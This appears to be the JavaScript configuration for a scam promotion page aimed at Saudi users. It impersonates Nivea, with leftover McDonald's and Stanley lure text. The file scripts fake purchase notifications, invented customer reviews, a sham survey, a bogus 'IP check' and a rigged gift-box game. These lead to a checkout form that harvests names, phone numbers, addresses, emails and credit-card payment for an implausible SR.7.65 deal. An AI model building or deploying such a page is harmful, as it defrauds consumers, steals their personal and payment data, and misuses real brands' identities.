const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "sa";
  const lang = "ar-SA";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Talla: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
Felicidades!<br><br>
Participaste en la promoción de Stanley: tienes la oportunidad de comprar el termo con molde para hielo STANLEY QUENCHER H2.0 por solo <b>$37</b>!
`,
  };

  const notifications = [
    {
      user: "يوسف *****",
      location: "الرياض، المملكة العربية السعودية",
      action: "لقد تلقيت للتو مرطبًا بقيمة 7.65.SR!",
      timeago: "منذ 15 ثانية",
    },
    {
      user: "عائشة ******",
      location: "جدة، المملكة العربية السعودية",
      action: "لقد تلقيت للتو الشامبو بسعر 7.65.SR!",
      timeago: "منذ 25 ثانية",
    },
  ];

  const reviewsArr = [
    {
      name: "محمد",
      time: "قبل يوم واحد",
      header: "إنه أمر لا يصدق!",
      product: "26468782",
      review:
        "باعتباري أحد عملاء Nivea لسنوات عديدة، تفاجأت جدًا بالعثور على منتجات Nivea المفضلة لدي بسعر معقول جدًا 😊",
    },
    {
      name: "علي",
      time: "قبل يومين",
      header: "رائع! لا أجد الكلمات.",
      product: "26468789",
      review:
        "قررت أن أجرب نيفيا للمرة الأولى والآن أصبحت منتجات التجميل المفضلة لدي، شكرًا لك!",
    },
    {
      name: "فاطمة",
      time: "قبل يومين",
      header: "رائع ببساطة.",
      product: "26468785",
      review: "تتمتع نيفيا بجودة ممتازة، أوصي بها للجميع، منتج موثوق به!",
    },
    {
      name: "عائشة",
      time: "قبل أربعة أيام",
      header: "أعجبني",
      review:
        "لأكون صادقًا، أنا أهتم حقًا بجمالي، لذا فإن نيفيا هو ما أحتاجه تمامًا.",
    },
    {
      name: "يوسف",
      time: "قبل سبعة أيام",
      header: "واو، أنا أحب هذا المنتج تماماً!",
      product: "26468784",
      review:
        "في البداية اعتقدت أن نيفيا لا قيمة لها، لكن لحسن الحظ شاركت في هذا العرض الترويجي من نيفيا ولست نادمًا على ذلك. شكرًا لك!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "MEINUNGEN UND BEWERTUNGEN",
    percent: "99%",
    rec: "تعليقات حول هذا العرض الترويجي",
  };

  const questions = {
    _of: "سؤال {1} من {2}: ",
    arr: [
      {
        q: "هل سبق لك أن طلبت منتجات من ماكدونالدز؟",
        a: [
          "نعم، أطلب بشكل متكرر",
          "نعم، أطلب نادراً",
          "لم أطلب من قبل",
        ],
      },
      {
        q: "هل يجب على ماكدونالدز الاستمرار في مثل هذه الحملات الإعلانية؟",
        a: ["نعم، بالطبع!", "نعم، لكن غيروا القائمة الترويجية", "لا"],
      },
      {
        q: "هل ستوصي بمنتجاتنا لأصدقائك؟",
        a: ["نعم", "لا"],
      },
    ],
  };

  const check = {
    title: "سيتم مراجعة إجابتك",
    arr: [
      "لقد أجبت على السؤال 3 من 3",
      "عنوان IP الخاص بك لا يُظهر طلبات سابقة",
      "تم التحقق من إجابتك",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "شكراً لمشاركتك في الاستبيان!",
        button: "حاول حظك",
        text: `
<center>
    للحصول على قائمة ماكدونالدز بسعر ترويجي، يجب عليك اختيار صندوق الهدايا الصحيح.
          <br><br>
       لديك 3 محاولات، حظاً موفقاً!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "أوه، لا..",
        button: "حاول مرة أخرى",
        text: `
        <center>
       للأسف، هذه الهدية فارغة! لديك محاولتان متبقيتان - حظاً موفقاً!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "قسيمة هدية لأي منتج من منتجات نيفيا",
        button: "احصل على القسيمة",
        text: `
<center>
  <p style="color: #ffffff">
  </p>
  <br>
  اضغط على "احصل على القسيمة"، املأ النموذج وادفع الطلب.
   <br><br>
  استلم رسالة نصية تحتوي على القسيمة وتعليمات تفعيلها.
  <br><br>
  يمكن تفعيل القسيمة في أي وقت، ولا يتطلب الأمر دفعاً إضافياً.
</center>
      `,
      },
    },
    select: {
      texts: {
        header: "قسيمة هدية لأي منتج من منتجات نيفيا",
        button: "حدد هذا المنتج",
        text: `
<center>
  <p style="color: #ffffff">
  </p>
  <br>
  اضغط على "احصل على القسيمة"، املأ النموذج وادفع الطلب.
   <br><br>
  استلم رسالة نصية تحتوي على القسيمة وتعليمات تفعيلها.
  <br><br>
  يمكن تفعيل القسيمة في أي وقت، ولا يتطلب الأمر دفعاً إضافياً.
</center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "المعلومات الشخصية",
      fields: {
        name: {
          enabled: true,
          field: "الاسم",
        },
        family: {
          enabled: true,
          field: "اللقب",
        },
        phone: {
          enabled: true,
          field: "رقم الهاتف",
        },
        email: {
          enabled: true,
          field: "البريد الإلكتروني",
        },
      },
    },
    delivery: {
      title: "التوصيل",
      fields: {
        city: {
          enabled: true,
          field: "المدينة",
        },
        address: {
          enabled: true,
          field: "عنوان التوصيل",
        },
        zip: {
          enabled: true,
          field: "الرمز البريدي",
        },
      },
    },
    payment: {
      title: "طرق الدفع",
      creditCard: "الدفع عبر الإنترنت بواسطة بطاقة الائتمان",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "تفاصيل الطلب",
      oldPrice: "",
      newPrice: "",
      oldBackupPrice: "SR.299.00",
      newBackupPrice: "SR.7.65",
      size: "Talla",
      subTotal: {
        title: "قيمة الطلب",
        amount: "",
      },
      delivery: {
        title: "التوصيل",
        amount: "SR.0.00",
      },
      total: {
        title: "الإجمالي",
        amount: "",
      },
      checkoutButton: "ادفع طلبك",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "بخاخ الحماية من العرق بلاك اند وايت انفيزيبل من نيفيا للرجال، اصلي 3x150 ملليلتر، منعش، 450 ملليلتر",
      miniImg: "./src/img/slide1.png",

      images: ["./src/img/slide1.png"],
      amountInStock: 7,
      oldPrice: "SR.87.00",
      newPrice: "SR.7.65",
      description: "تركيبة جديدة 5 في 1: ضد الروائح والعرق والبقع والبقايا والتهيج. يوفر حماية موثوقة ضد العرق لمدة 48 ساعة. لا يترك بقعاً بيضاء على الملابس السوداء، ويمنع تكون البقع الصفراء على الملابس البيضاء.",
    },
    {
      id: "26468782",
      name: "لوشن جسم للبشرة الجافة من نيفيا بزبدة الكاكاو وفيتامين E عدد 3 × سعة 400 ملم",
      miniImg: "./src/img/slide2.png",

      images: ["./src/img/slide2.png"],
      amountInStock: 5,
      oldPrice: "SR.103.00",
      newPrice: "SR.7.65",
      description: "يحتوي على مصل ترطيب عميق يخفف من جفاف البشرة. غني بزبدة الكاكاو وفيتامين E. يوفر للبشرة رعاية وترطيب ممتازين يدوم لمدة 48 ساعة.",
    },
    {
      id: "26468783",
      name: "لوشن مرطب للجسم بخلاصة زيت اللوز المغذي وفيتامين E للبشرة شديدة الجفاف من نيفيا، 3×400 مل",
      miniImg: "./src/img/slide3.png",

      images: ["./src/img/slide3.png"],
      amountInStock: 9,
      oldPrice: "SR.103.00",
      newPrice: "SR.7.65",
      description: "يحتوي على مصل ترطيب عميق يخفف من جفاف البشرة. غني بزيت اللوز لتزويد البشرة بالعناصر الغذائية المركزة. يمنح البشرة رعاية وترطيباً ممتازاً يدوم لمدة 48 ساعة",
    },
    {
      id: "26468784",
      name: "بخاخ مزيل للعرق بمستخلصات اللؤلؤ للنساء من نيفيا، سعة 150 ملليلتر من 3 قطع، منعش، للنساء، 150 ملليلتر، للنساء، للنساء",
      miniImg: "./src/img/slide4.png",

      images: ["./src/img/slide4.png"],
      amountInStock: 0,
      oldPrice: "SR.92.00",
      newPrice: "SR.7.65",
      description: "توفر تركيبته حمايةً موثوقةً ضد العرق لمدة 48 ساعة",
    },
    {
      id: "26468785",
      name: "مزيل عرق ديب بلاك كربون للرجال من نيفيا بتركيبة مضاد للبكتيريا برائحة الخشب الداكن، 3x 50 ملليلتر، منعش، 50 ملليلتر",
      miniImg: "./src/img/slide5.png",

      images: ["./src/img/slide5.png"],
      amountInStock: 0,
      oldPrice: "SR.70.20",
      newPrice: "SR.7.65",
      description: "تركيبة مضادة للبكتيريا بالكربون الأسود",
    },
    {
      id: "26468786",
      name: "كريم نيڤيا، كريم ترطيب متعدد الاستخدامات من نيڤيا، علبة معدنية 400 مل",
      miniImg: "./src/img/slide6.png",

      images: ["./src/img/slide6.png"],
      amountInStock: 0,
      oldPrice: "SR.33.00",
      newPrice: "SR.7.65",
      description: "تقنية الترطيب: تركيبة سميكة وغنية للبشرة لاحتواءها على يوسيريت Eucerit وبانثينول Panthenol وجلسرين.",
    },

  ];

  const footer = {
    cr: "حقوق الطبع والنشر © بايرسدورف 2024",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = window.__config.selectedProduct.id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCatalog = () => {
  document.querySelector("#catalog").setAttribute("style", "display: flex");
};
const closeCatalog = () => {
  document.querySelector("#catalog").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});